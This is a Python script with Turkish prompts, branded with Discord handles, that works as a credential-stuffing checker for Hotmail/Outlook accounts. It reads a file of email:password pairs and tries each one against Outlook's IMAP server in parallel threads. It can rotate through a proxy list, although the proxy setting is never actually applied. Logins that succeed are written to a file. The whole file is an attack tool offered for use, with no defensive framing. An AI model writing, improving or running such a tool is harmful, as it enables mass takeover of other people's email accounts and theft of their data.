import importlib
import subprocess
from concurrent.futures import ThreadPoolExecutor
import random
import imaplib
from termcolor import colored

# Gerekli modüllerin isimleri
required_modules = ['termcolor', 'concurrent.futures', 'requests', 'PySocks', 'socks']

def check_and_install_module(module_name):
    try:
        importlib.import_module(module_name)
        print(f"{module_name} modülü zaten yüklü.")
    except ImportError:
        print(f"{module_name} modülü yüklenmedi, yükleniyor...")
        subprocess.check_call(['pip', 'install', module_name])
        print(f"{module_name} modülü başarıyla yüklendi.")

def print_banner():
    print(colored("""
┏┓╋┏┓╋╋┏┓╋╋╋╋╋╋╋┏┓╋┏━━━┳┓╋╋╋╋╋╋╋┏┓
┃┃╋┃┃╋┏┛┗┓╋╋╋╋╋╋┃┃╋┃┏━┓┃┃╋╋╋╋╋╋╋┃┃
┃┗━┛┣━┻┓┏╋┓┏┳━━┳┫┃╋┃┃╋┗┫┗━┳━━┳━━┫┃┏┳━━┳━┓
┃┏━┓┃┏┓┃┃┃┗┛┃┏┓┣┫┃╋┃┃╋┏┫┏┓┃┃━┫┏━┫┗┛┫┃━┫┏┛
┃┃╋┃┃┗┛┃┗┫┃┃┃┏┓┃┃┗┓┃┗━┛┃┃┃┃┃━┫┗━┫┏┓┫┃━┫┃
┗┛╋┗┻━━┻━┻┻┻┻┛┗┻┻━┛┗━━━┻┛┗┻━━┻━━┻┛┗┻━━┻┛                                   
    """, 'cyan'))
    print(colored("discord.gg/versaquality\n instagram - discord: xmed4sa\n instagram: @veraildez , discord: @veraildez77", 'cyan'))

def check_hotmail_account(email_address, password, proxy=None):
    try:
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        mail = imaplib.IMAP4_SSL('imap-mail.outlook.com')
        mail.login(email_address, password)
        mail.select('inbox')
        status, messages = mail.search(None, 'ALL')
        mail.logout()
        if status == "OK":
            return True
        else:
            return False
    except imaplib.IMAP4.error:
        return False
    except Exception as e:
        print(colored(f"Hata oluştu: {e}", 'red'))
        return False

def process_account(account, proxies=None):
    email_address, password = account.strip().split(':')
    proxy = random.choice(proxies) if proxies else None
    if check_hotmail_account(email_address, password, proxy):
        print(colored(f"Hesap {email_address} geçerli. | Checker By = discord.gg/versaquality - @xmed4sa @veraildez77", 'green'))
        with open('basarili.txt', 'a') as f:
            f.write(f"{email_address}:{password} | Checker By = discord.gg/versaquality - @xmed4sa @veraildez77\n")
        return True
    else:
        print(colored(f"Hesap {email_address} geçersiz veya giriş başarısız. | Checker By = discord.gg/versaquality - @xmed4sa @veraildez77", 'red'))
        return False

def check_accounts(file_path, proxies=None, max_workers=None):
    with open(file_path, 'r') as file:
        accounts = file.readlines()

    if not max_workers:
        max_workers = int(input("Thread Sayısı Gir (proxy kullanmıyorsan 1-10 arası tavsiye edilir): "))
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        results = list(executor.map(lambda acc: process_account(acc, proxies), accounts))

    if any(results):
        print(colored("Geçerli hesaplar basarili.txt dosyasına kaydedildi.", 'blue'))
    else:
        print(colored("Geçerli hesap bulunamadı.", 'yellow'))

def main():
    for module in required_modules:
        check_and_install_module(module)

    print("Gerekli modüller başarıyla yüklendi veya zaten yüklü.")
    print_banner()
    
    while True:
        password = input("Lütfen şifreyi girin (versaquality): ")
        if password == 'versaquality':
            break
        else:
            print(colored("Şifre yanlış, tekrar deneyin.", 'red'))

    proxy_choice = input("Proxy kullanmak ister misiniz? (evet/hayır): ").strip().lower()
    
    proxies = None
    if proxy_choice == 'evet':
        proxy_file_path = input("Lütfen HTTP proxylerin olduğu dosya yolunu girin: ")
        with open(proxy_file_path, 'r') as proxy_file:
            proxies = [proxy.strip() for proxy in proxy_file.readlines()]
        print(colored("Proxy listesi yüklendi, rastgele proxyler kullanılacak.", 'blue'))
    
    file_path = input("Lütfen hesapların olduğu dosya yolunu girin: ")
    check_accounts(file_path, proxies)

if __name__ == "__main__":
    main()
